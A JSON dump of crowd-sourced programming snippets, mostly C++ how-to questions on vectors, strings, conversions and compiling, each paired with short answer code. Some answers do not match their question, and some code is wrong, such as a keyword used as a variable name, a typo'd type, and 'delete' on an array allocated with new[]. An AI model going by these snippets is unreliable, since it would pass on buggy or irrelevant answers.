    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2308,
    "keyword": null,
    "link": null,
    "title": " how to allocate memory for vector c++",
    "description": "std::vector<int> vec1; vec1.reserve(30);  // Allocate space for 30 items, but vec1 is still empty.  std::vector<int> vec2; vec2.resize(30);  // Allocate space for 30 items, and vec2 now contains 30 items.\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2309,
    "keyword": null,
    "link": null,
    "title": " how to allocate on heap in c++",
    "description": "//placement new in c++ char *buf  = new char[sizeof(string)]; // pre-allocated buffer string *p = new (buf) string(\"hi\");    // placement new string *q = new string(\"hi\");          // ordinary heap allocation /*Standard C++ also supports placement new operator, which constructs  an object on a pre-allocated buffer. This is useful when building a  memory pool, a garbage collector or simply when performance and exception  safety are paramount (there's no danger of allocation failure since the memory has already been allocated, and constructing an object on a pre-allocated buffer takes less time): */\n#include <iostream> #include <string>  using String = std::string; class Entity { private: \tString m_Name; public: \tEntity() : m_Name(\"Unknown\") {} \tEntity(const String& name) : m_Name(name) {} \tconst String& GetName() const { \t\treturn m_Name; \t}; }; int main() {   // new keyword is used to allocate memory on heap \tint* b = new int; // new keyword will call the c function malloc which will allocate on heap  memory = data and return a ptr to that plaock of memory \tint* c = new int[50]; \tEntity* e1 = new Entity;//new keyword Not allocating only memory but also calling the constructor \tEntity* e = new Entity[50]; \t//usually calling new will  call underlined c function malloc \t//malloc(50);  \tEntity* alloc = (Entity*)malloc(sizeof(Entity));//will not call constructor only  allocate memory = memory of entity \tdelete e;//calls a c function free \tEntity* e3 = new(c) Entity();//Placement New } \t\t\t\t\t\t\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2310,
    "keyword": null,
    "link": null,
    "title": " how to analyse a poem",
    "description": "Good Luck in the Exam or test! :)\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2311,
    "keyword": null,
    "link": null,
    "title": " how to append one vector to another c++",
    "description": "vector<int> a; vector<int> b; // Appending the integers of b to the end of a  a.insert(a.end(), b.begin(), b.end());\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2312,
    "keyword": null,
    "link": null,
    "title": " how to append to a vector c++",
    "description": "vector<int> a; vector<int> b; // Appending the integers of b to the end of a  a.insert(a.end(), b.begin(), b.end());\n//vector.push_back is the function. For example, if we want to add //3 to a vector, it is just vector.push_back(3) vector <int> vi; vi.push_back(1); //[1] vi.push_back(2); //[1,2]\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2313,
    "keyword": null,
    "link": null,
    "title": " how to append two vectors in c++",
    "description": "std::vector<int> AB = A; AB.insert(AB.end(), B.begin(), B.end());\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2314,
    "keyword": null,
    "link": null,
    "title": " how to arrange array in ascending order in c++\\",
    "description": "#include <iostream> using namespace std;  #define MAX 100  int main() { \t//array declaration \tint arr[MAX]; \tint n,i,j; \tint temp; \t \t//read total number of elements to read \tcout<<\"Enter total number of elements to read: \"; \tcin>>n; \t \t//check bound \tif(n<0 || n>MAX) \t{ \t\tcout<<\"Input valid range!!!\"<<endl; \t\treturn -1; \t} \t \t//read n elements \tfor(i=0;i<n;i++) \t{ \t\tcout<<\"Enter element [\"<<i+1<<\"] \"; \t\tcin>>arr[i]; \t} \t \t//print input elements \tcout<<\"Unsorted Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl; \t \t//sorting - ASCENDING ORDER \tfor(i=0;i<n;i++) \t{\t\t \t\tfor(j=i+1;j<n;j++) \t\t{ \t\t\tif(arr[i]>arr[j]) \t\t\t{ \t\t\t\ttemp  =arr[i]; \t\t\t\tarr[i]=arr[j]; \t\t\t\tarr[j]=temp; \t\t\t} \t\t} \t} \t \t//print sorted array elements \tcout<<\"Sorted (Ascending Order) Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl;\t \t \t \treturn 0; \t }\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2315,
    "keyword": null,
    "link": null,
    "title": " how to array in c++",
    "description": "int foo [5] = { 16, 2, 77, 40, 12071 }; \n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2316,
    "keyword": null,
    "link": null,
    "title": " how to assign all elements of vector in c++",
    "description": "#include <iostream> #include <vector> using namespace std;  // program to illustrate use of std::vector::assign()  int main() { \tint vec_size, new_val; \tcin >> vec_size >> new_val; \tvector<int> vec(vec_size);  \tfor (int x : vec) \t\tcout << x << \" \";  \tcout << endl;  \t// vec.assign(n, val) assigns all n elements of vec new value = val \tvec.assign(vec_size, new_val); \tfor (int x : vec) \t\tcout << x << \" \"; }\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2317,
    "keyword": null,
    "link": null,
    "title": " how to begin a vector in c++",
    "description": "// vector::begin/end #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   for (int i=1; i<=5; i++) myvector.push_back(i);    std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it = myvector.begin() ; it != myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2318,
    "keyword": null,
    "link": null,
    "title": " how to break out two for loops c++",
    "description": "  for (int i = 0; i < n1; ++i) {     [&] {       for (int j = 0; j < n2; ++j) {         for (int k = 0; k < n3; ++k) {           return; // yay we're breaking out of 2 loops here         }       }     }();   } \n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2319,
    "keyword": null,
    "link": null,
    "title": " how to build a calculator using c++",
    "description": "#include <iostream>  using namespace std;  int main() { int num1; int num2; char op;      cout << \"Enter a number:\" << endl;   cin >> num1; //takes input      cout << \"Enter another number:\" << endl; //prints some prompt   cin >> num2;      cout << \"Enter a operator:\" << endl; //prints some prompt   cin >> op;      if(op == '+')   {   cout << \"Result = \" << num1 + num2 << endl;   }else if(op == '-'){   cout << \"Result = \" << num1 - num2 << endl;   }else if(op == '*'){   cout << \"Result = \" << num1 * num2 << endl;   }else if(op == '/'){   cout << \"Result = \" << num1 / num2 << endl;   }       }\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2320,
    "keyword": null,
    "link": null,
    "title": " how to calculate inverse trigonometric values in c++",
    "description": "  * C++ Program to Obtain Inverse of a Trigonometric Ratio  */ #include <iostream> #include <cmath> #include <iomanip>   int main() {     double value, result;     int choice;       std::cout << \"Enter a choice \" << std::endl;     std::cout << \"1. Inverse Sine\" << std::endl;     std::cout << \"2. Inverse Cosine\" << std::endl;     std::cout << \"3. Inverse Tangent\" << std::endl;     std::cin  >> choice;     switch (choice) {         case 1:             std::cout << \"Enter a value \";             std::cin  >> value;             std::cout << \"asin(val) = \" << std::setprecision(3)                       << asin(value) << std::endl;             break;         case 2:             std::cout << \"Enter a value \";             std::cin  >> value;             std::cout << \"acos(val) = \" << std::setprecision(3)                       << acos(value) << std::endl;             break;         case 3:             std::cout << \"Enter a value \";             std::cin  >> value;             std::cout << \"atan(val) = \" << std::setprecision(3)                       << atan(value)  << std::endl;             break;     }     return 0; }\n",
    "reg_date": "2021-10-12T11:40:42.000Z"
  },
  {
    "id": 2321,
    "keyword": null,
    "link": null,
    "title": " how to calculate trigonometric values in c++",
    "description": "*  * C++ Program to Illustrate Trigonometric functions  */ #include <iostream> #include <iomanip> #include <cmath> const double PI = 3.14159265;   int main() {     double degrees, radians;       std::cout << \"Enter angle in degrees \";     std::cin >> degrees;     // Trigonometric functions accept angles in radians     radians = degrees * PI / 180.0;     std::cout << \"Value of trigonometric ratios \" << std::endl;     std::cout << \"cos(radians) = \" << std::setprecision(3)               << cos(radians) << std::endl;     std::cout << \"sin(radians) = \" << std::setprecision(3)               << sin(radians) << std::endl;     std::cout << \"tan(radians) = \" << std::setprecision(3)               << tan(radians) << std::endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2322,
    "keyword": null,
    "link": null,
    "title": " how to cast int c++",
    "description": "int(var)\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2323,
    "keyword": null,
    "link": null,
    "title": " how to cehck if list has element c++",
    "description": "bool found = (std::find(my_list.begin(), my_list.end(), my_var) != my_list.end());\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2324,
    "keyword": null,
    "link": null,
    "title": " how to change a string to an float in c++",
    "description": "#include <iostream> #include <string>  int main() {     std::string str = \"123.4567\";      // convert string to float     float num_float = std::stof(str);      // convert string to double     double num_double = std::stod(str);     std:: cout<< \"num_float = \" << num_float << std::endl;    std:: cout<< \"num_double = \" << num_double << std::endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2325,
    "keyword": null,
    "link": null,
    "title": " how to change colour image to grey in opencv c++",
    "description": "//change the color image to grayscale image cvtColor(image, image, COLOR_BGR2GRAY); \n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2326,
    "keyword": null,
    "link": null,
    "title": " how to change the icon of an exe in c++",
    "description": "AAA ICON myicon.ico\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2327,
    "keyword": null,
    "link": null,
    "title": " how to change the type of something in c++",
    "description": "static_cast<the type you want> (variable)\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2328,
    "keyword": null,
    "link": null,
    "title": " how to change the value of a key in hashmp in c++",
    "description": "std::map<char, int> m; m.insert(std::make_pair('c', 0));  // c is for cookie  std::map<char, int>::iterator it = m.find('c');  if (it != m.end())     it->second = 42; \n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2329,
    "keyword": null,
    "link": null,
    "title": " how to check a number in string",
    "description": "To find whether a given string contains a number, convert it to a character array and find whether  each character in the array is a digit using the isDigit()  method of the Character class\n//Add this to your code and call static private boolean isMyNumber(String s){         try{             Integer.parseInt(s);             return true;         }catch (Exception e){             return false;         }     }\n",
    "reg_date": "2021-10-12T11:40:43.000Z"
  },
  {
    "id": 2330,
    "keyword": null,
    "link": null,
    "title": " how to check array is sorted or not in c++",
    "description": "bool check_sorted(int a[],int n) {  \treturn is_sorted(a,a+n); //stl function  }\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2331,
    "keyword": null,
    "link": null,
    "title": " how to check char array equality in c++",
    "description": "#include <string.h>  if( !strcmp( charTime, buf )) \n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2332,
    "keyword": null,
    "link": null,
    "title": " how to check datatype of a variable in c++",
    "description": "#include <typeinfo> ... cout << typeid(variable).name() << endl;\nint k; cout << typeid(k).name() << endl;\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2333,
    "keyword": null,
    "link": null,
    "title": " how to check if a value is inside an array in c++",
    "description": "if (std::find(std::begin(ourArray), std::end(ourArray), 99) != std::end(ourArray)) { \t// Do stuff }\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2334,
    "keyword": null,
    "link": null,
    "title": " how to check if file is opened c++",
    "description": "ifstream file; file.open(argv[1]); if (!file.is_open()) {    cerr << \"File did not open\";   exit(1);  }\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2335,
    "keyword": null,
    "link": null,
    "title": " how to check if java is installed on windows 10",
    "description": "type in cmd \"java\"\nOn Windows 10: Start > Control Panel > Program > Java  If you can't see a Java option then you don't have Java installed. Otherwise, this should open the Java Control Panel. Click the 'About'  button to view version information.\nOpen cmd and write \"java -version\" if there is intalled, the details will be displayed\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2336,
    "keyword": null,
    "link": null,
    "title": " how to check if the number is even or odd using bitwise operator",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint num; \tcin>>num; \tif(num & 1){ \t\tcout<<\"odd\"; \t} \telse{ \t\tcout<<\"even\"; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2337,
    "keyword": null,
    "link": null,
    "title": " how to check if vector is ordered c++",
    "description": "#include <vector> // vector  #include <algorithm> // is_sorted #include <iostream> // cout  using namespace std; int main() {     vector<int> a = {6,5,3,5,7,8,5,2,1};     vector<int> b = {1,2,3,4,5,6,7,8,9};          if(is_sorted(a.begin(), a.end()))         cout << \"a is sorted\\n\";     else         cout << \"a is not sorted\\n\";          if(is_sorted(b.begin(), b.end()))         cout << \"b is sorted\\n\";     else         cout << \"b is not sorted\\n\"; }\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2338,
    "keyword": null,
    "link": null,
    "title": " how to check private messages on reddit",
    "description": "if (Input.GetKeyDown)\n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2339,
    "keyword": null,
    "link": null,
    "title": " how to check size of file in c++",
    "description": "#include <fstream>  std::ifstream::pos_type filesize(const char* filename) {     std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);     return in.tellg();  } \n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2340,
    "keyword": null,
    "link": null,
    "title": " how to check sqrt of number is integer c++",
    "description": "bool isPerfectSquare(long double x)  {      // Find floating point value of     // square root of x.    long double sr = sqrt(x);       // If square root is an integer    return ((sr - floor(sr)) == 0);  } \n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2341,
    "keyword": null,
    "link": null,
    "title": " how to check string contains char in c++",
    "description": "std::string s = \"Hello\"; if (s.find('e') != std::string::npos)     cout << \"Found\"; else     cout << \"Not Found\"; \n",
    "reg_date": "2021-10-12T11:40:44.000Z"
  },
  {
    "id": 2342,
    "keyword": null,
    "link": null,
    "title": " how to check the datatype of a variable in c++",
    "description": "#include <typeinfo> ... cout << typeid(variable).name() << endl;\n#include <typeinfo> #include <iostream>  class someClass { };  int main(int argc, char* argv[]) {     int a;     someClass b;     std::cout<<\"a is of type: \"<<typeid(a).name()<<std::endl;    \t// Output 'a is of type int'     std::cout<<\"b is of type: \"<<typeid(b).name()<<std::endl;    \t// Output 'b is of type someClass'     return 0;   \t// on the online compiler it comes as 'i' for int and 'c' for char }\nint k; cout << typeid(k).name() << endl;\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2343,
    "keyword": null,
    "link": null,
    "title": " how to check type in c++",
    "description": "#include <typeinfo> #include <iostream>  class someClass { };  int main(int argc, char* argv[]) {     int a;     someClass b;     std::cout<<\"a is of type: \"<<typeid(a).name()<<std::endl;    \t// Output 'a is of type int'     std::cout<<\"b is of type: \"<<typeid(b).name()<<std::endl;    \t// Output 'b is of type someClass'     return 0;   \t// on the online compiler it comes as 'i' for int and 'c' for char }\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2344,
    "keyword": null,
    "link": null,
    "title": " how to choose struct's endianness cpp",
    "description": "#include <stdio.h> #include <stdint.h>  //The line bellow does the trick: //__attribute__((packed, scalar_storage_order(\"big-endian\"))) struct __attribute__((packed, scalar_storage_order(\"big-endian\"))) mystruct {     uint16_t a;     uint32_t b;     uint64_t c; };   int main(int argc, char** argv) {     struct mystruct bar = {.a = 0xaabb, .b = 0xff0000aa, .c = 0xabcdefaabbccddee};      FILE *f = fopen(\"out.bin\", \"wb\");     size_t written = fwrite(&bar, sizeof(struct mystruct), 1, f);     fclose(f); } \n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2345,
    "keyword": null,
    "link": null,
    "title": " how to cin multiple lines of strings c++",
    "description": "How to cin c++ \n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2346,
    "keyword": null,
    "link": null,
    "title": " how to clear a string in c++",
    "description": "str.clear();  \n string& erase (size_t pos = 0, size_t len = npos); /* pos Position of the first character to be erased. If this is greater than the string length, it throws out_of_range. Note: The first character in str is denoted by a value of 0 (not 1). len Number of characters to erase (if the string is shorter, as many characters as possible are erased). A value of string::npos indicates all characters until the end of the string. */\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2347,
    "keyword": null,
    "link": null,
    "title": " how to clear cin buffer",
    "description": "int number;  cout << \"Enter an Integer: \"; cin >> number;  // User types any char or string of length < 100  // Because input stream is in a failed state, cin will be evaluated to false while ( !cin ) {     cin.clear ();    // Restore input stream to working state     cin.ignore ( 100 , '\\n' );    // Get rid of any garbage that user might have entered     cout << \"I said enter an integer, Dumbass. Try again: \";     cin >> number;    // After cin is restored and any garbage in the stream has been cleared, store user input in number again }\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2348,
    "keyword": null,
    "link": null,
    "title": " how to clear console c++",
    "description": "#include <Windows.h>  int main() { \t//print stuff      \tsystem(\"cls\"); // clear console }\nsystem (\"CLS\");\n#ifdef __cplusplus__   #include <cstdlib> #else   #include <stdlib.h> #endif  if (system(\"CLS\")) system(\"clear\");\ni swear if you write system(\"cls\"); one more time you're ugly\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2349,
    "keyword": null,
    "link": null,
    "title": " how to clear stringstream c++",
    "description": "m.str(\"\");\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2350,
    "keyword": null,
    "link": null,
    "title": " how to code in c++",
    "description": "#include <iostream> #include<conio.h> /* For getch() only */ using namespace std; int main () {    int num = 10;             if (num % 2 == 0)             {                 cout<<\"It is an even number\";             } getch();  /* getch is the function of conio.h */ }\nhelp me i dont now what the freak am doing any more\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2351,
    "keyword": null,
    "link": null,
    "title": " how to compare lower case character to uppercase cpp",
    "description": "for(int i=0;i<str.size();i++){ int c = str[i];          if (islower(c))               str[i] = toupper(c); }\n",
    "reg_date": "2021-10-12T11:40:45.000Z"
  },
  {
    "id": 2352,
    "keyword": null,
    "link": null,
    "title": " how to compare strings in c++",
    "description": "// comparing apples with apples #include <iostream> #include <string>  int main () {   std::string str1 (\"green apple\");   std::string str2 (\"red apple\");    if (str1.compare(str2) != 0)     std::cout << str1 << \" is not \" << str2 << '\\n';    if (str1.compare(6,5,\"apple\") == 0)     std::cout << \"still, \" << str1 << \" is an apple\\n\";    if (str2.compare(str2.size()-5,5,\"apple\") == 0)     std::cout << \"and \" << str2 << \" is also an apple\\n\";    if (str1.compare(6,5,str2,4,5) == 0)     std::cout << \"therefore, both are apples\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2353,
    "keyword": null,
    "link": null,
    "title": " how to compare the biggest node with the same level BST node c++",
    "description": "// C++ program to find largest // value on each level of binary tree. #include <bits/stdc++.h> using namespace std;  /* A binary tree node has data, pointer to left child and a pointer to right child */ struct Node { \tint val; \tstruct Node *left, *right; };  /* Recursive function to find the largest value on each level */ void helper(vector<int>& res, Node* root, int d) { \tif (!root) \t\treturn;  \t// Expand list size \tif (d == res.size()) \t\tres.push_back(root->val);  \telse  \t\t// to ensure largest value \t\t// on level is being stored \t\tres[d] = max(res[d], root->val);  \t// Recursively traverse left and \t// right subtrees in order to find \t// out the largest value on each level \thelper(res, root->left, d + 1); \thelper(res, root->right, d + 1); }  // function to find largest values vector<int> largestValues(Node* root) { \tvector<int> res; \thelper(res, root, 0); \treturn res; }  /* Helper function that allocates a new node with the given data and NULL left and right pointers. */ Node* newNode(int data) { \tNode* temp = new Node; \ttemp->val = data; \ttemp->left = temp->right = NULL; \treturn temp; }  // Driver code int main() { \t/* Let us construct a Binary Tree \t\t4 \t/ \\ \t9 2 \t/ \\ \\ \t3 5 7 */  \tNode* root = NULL; \troot = newNode(4); \troot->left = newNode(9); \troot->right = newNode(2); \troot->left->left = newNode(3); \troot->left->right = newNode(5); \troot->right->right = newNode(7); \t \tvector<int> res = largestValues(root); \tfor (int i = 0; i < res.size(); i++) \t\tcout << res[i] << \" \"; \t\t \treturn 0; } \n// C++ implementation to print largest // value in each level of Binary Tree #include <bits/stdc++.h>  using namespace std;  // structure of a node of binary tree struct Node { \tint data; \tNode *left, *right; };  // function to get a new node Node* newNode(int data) { \t// allocate space \tNode* temp = new Node;  \t// put in the data \ttemp->data = data; \ttemp->left = temp->right = NULL; \treturn temp; }  // function to print largest value // in each level of Binary Tree void largestValueInEachLevel(Node* root) { \t// if tree is empty \tif (!root) \t\treturn;  \tqueue<Node*> q; \tint nc, max;  \t// push root to the queue 'q' \tq.push(root);  \twhile (1) { \t\t// node count for the current level \t\tnc = q.size();  \t\t// if true then all the nodes of \t\t// the tree have been traversed \t\tif (nc == 0) \t\t\tbreak;  \t\t// maximum element for the current \t\t// level \t\tmax = INT_MIN;  \t\twhile (nc--) {  \t\t\t// get the front element from 'q' \t\t\tNode* front = q.front();  \t\t\t// remove front element from 'q' \t\t\tq.pop();  \t\t\t// if true, then update 'max' \t\t\tif (max < front->data) \t\t\t\tmax = front->data;  \t\t\t// if left child exists \t\t\tif (front->left) \t\t\t\tq.push(front->left);  \t\t\t// if right child exists \t\t\tif (front->right) \t\t\t\tq.push(front->right); \t\t}  \t\t// print maximum element of \t\t// current level \t\tcout << max << \" \"; \t} }  // Driver code int main() { \t/* Construct a Binary Tree \t\t4 \t/ \\ \t9 2 \t/ \\ \\ \t3 5 7 */  \tNode* root = NULL; \troot = newNode(4); \troot->left = newNode(9); \troot->right = newNode(2); \troot->left->left = newNode(3); \troot->left->right = newNode(5); \troot->right->right = newNode(7);  \t// Function call \tlargestValueInEachLevel(root);  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2354,
    "keyword": null,
    "link": null,
    "title": " how to compare two char* in c++",
    "description": "#include <string.h> ... if (strcmp(firstSTR, secondSTR) == 0) {     // strings are equal     ... } else {     // strings are NOT equal }\n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2355,
    "keyword": null,
    "link": null,
    "title": " how to compile and run cpp code in terminal",
    "description": "# compile cpp_code.cpp g++ cpp_code.cpp  # run compiled file ./a.out\n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2356,
    "keyword": null,
    "link": null,
    "title": " how to compile opencv c++ in ubuntu",
    "description": "   1 #!/bin/bash    2 echo \"compiling $1\"    3 if [[ $1 == *.c ]]    4 then    5     gcc -ggdb `pkg-config --cflags opencv` -o `basename $1 .c` $1 `pkg-config --libs opencv`;    6 elif [[ $1 == *.cpp ]]    7 then    8     g++ -ggdb `pkg-config --cflags opencv` -o `basename $1 .cpp` $1 `pkg-config --libs opencv`;    9 else   10     echo \"Please compile only .c or .cpp files\"   11 fi   12 echo \"Output file => ${1%.*}\" \n   1 $ alias opencv=\"~/.compile_opencv.sh\"    2 $ opencv opencvtest.c    3 $ ./opencvtest \n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2357,
    "keyword": null,
    "link": null,
    "title": " how to compile with libstdc++ fedora",
    "description": "sudo dnf install libstdc++-devel libstdc++-devel.i686 \nsudo dnf install libstdc++-static libstdc++-static.i686 \n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2358,
    "keyword": null,
    "link": null,
    "title": " how to complie c++ to spesific name using terminal",
    "description": "g++ /*name of .cpp program*/ -o /* name of exacuable*/\n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2359,
    "keyword": null,
    "link": null,
    "title": " how to complie with c++ 17",
    "description": "g++ fileName.cpp -std=c++17 -o executableName ./executableName\n",
    "reg_date": "2021-10-12T11:40:46.000Z"
  },
  {
    "id": 2360,
    "keyword": null,
    "link": null,
    "title": " how to concatenate two big strings without using strcat in c++",
    "description": "cin >> doubleNumber; cin.ignore();  //ignores an end of line character  getline(cin, stringName); \n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2361,
    "keyword": null,
    "link": null,
    "title": " how to concatenate two vectors in c++",
    "description": "vector<int> a, b; //fill with data b.insert(b.end(), a.begin(), a.end()); \n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2362,
    "keyword": null,
    "link": null,
    "title": " how to concatenate vectors in c++",
    "description": "vector1.insert( vector1.end(), vector2.begin(), vector2.end() );\nvector1.insert( vector1.end(), vector2.begin(), vector2.end() ); \n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2363,
    "keyword": null,
    "link": null,
    "title": " how to concatinate two strings in c++",
    "description": "#include <iostream> #include <cstdlib>  std::string text = \"hello\"; std::string moretext = \"there\"; std::string together = text + moretext; std::cout << together << std::endl;  >> hello there\n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2364,
    "keyword": null,
    "link": null,
    "title": " how to convert a string to a double c++",
    "description": "double new = std::stod(string);\n#include <iostream> using namespace std; int main() {    char s[20] = \"18.2894 is a number\";    char *p;    double result;    result = strtod(s, &p);    cout<<\"The number after conversion of string : \"<<result;    return(0); }\n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2365,
    "keyword": null,
    "link": null,
    "title": " how to convert array into set in c++",
    "description": "set<int> res(arr, arr + sizeArr);\n#include <iostream> #include <unordered_set>   int main() {     int A[] = { 1, 2, 3, 4, 5 };       std::unordered_set<int> s;     for (int i: A) {         s.insert(i);     }       for (int i: s) {         std::cout << i << \" \";     }       return 0; } \n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2366,
    "keyword": null,
    "link": null,
    "title": " how to convert ascii to char in cpp",
    "description": "#include<bits/stdc++.h> using namespace std; int main(){   char a=char(97); //ascii value of a   cout<<a; } \n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2367,
    "keyword": null,
    "link": null,
    "title": " how to convert from string to int in c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include<string> string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";  int myint1 = stoi(str1); std::cout<<stoi(str1);\n// EXAMPLE std::string sStringAsString = \"789\"; int iStringAsInt = atoi( sStringAsString.c_str() );  /* SYNTAX atoi( <your-string>.c_str() ) */  /* HEADERS #include <cstring> #include <string> */\n#include <iostream> #include <sstream>  using namespace std;  int main() {     string s = \"999\";      stringstream degree(s);      int x = 0;     degree >> x;      cout << \"Value of x: \" << x; }\n",
    "reg_date": "2021-10-12T11:40:47.000Z"
  },
  {
    "id": 2368,
    "keyword": null,
    "link": null,
    "title": " how to convert int to std::string",
    "description": "std::to_string(3);\n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2369,
    "keyword": null,
    "link": null,
    "title": " how to convert int to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\n#include <string> using namespace std;  int iIntAsInt = 658; string sIntAsString = to_string(iIntAsInt);\nint x = 5; string str = to_string(x);\n#include <iostream>   #include<string>   using namespace std;   int main()   {    int i=11;      string str= to_string(i);      cout<<\"string value of integer i is :\"<<str<<\"\\n\";    return 0; }  \n#include <iostream>   #include <boost/lexical_cast.hpp>   using namespace std;   int main()   {    int i=11;    string str = boost::lexical_cast<string>(i);   cout<<\"string value of integer i is :\"<<str<<\"\\n\";      }  \n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2370,
    "keyword": null,
    "link": null,
    "title": " how to convert n space separated integers in c++",
    "description": "int i, n, arr[100];  scanf(\"%d\", &n); for (i = 0; i < n; ++i)     scanf(\"%d\", &arr[i]); \n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2371,
    "keyword": null,
    "link": null,
    "title": " how to convert qt string to string",
    "description": "QString qs; // do things std::cout << qs.toStdString() << std::endl;\n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2372,
    "keyword": null,
    "link": null,
    "title": " how to convert radians to degrees",
    "description": "radians = degrees * pi / 180;\ndouble radians = Math.toRadians(degrees);\n// Math is in the System namespace. double radians = degrees * Math.PI / 180;\n// Math is in the System namespace. double degrees = radians * 180 / Math.PI;\n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2373,
    "keyword": null,
    "link": null,
    "title": " how to convert string into lowercase in cpp",
    "description": "  // sl is the string which is converted to lowercase      string sl = \"Jatin Goyal\";         // using transform() function and ::tolower in STL      transform(sl.begin(), sl.end(), sl.begin(), ::tolower); \n#include<bits/stdc++.h>  using namespace std;  main() {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::tolower); //lowercase     cout << s << endl;  } \nstr[i] = tolower(str[i]);\nint i = 0;     while(str[i])     {         if(str[i] == std::toupper(str[i]) && std::isalpha(str[i]) == 1024)         str[i]+= 32;         ++i;     }\n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2374,
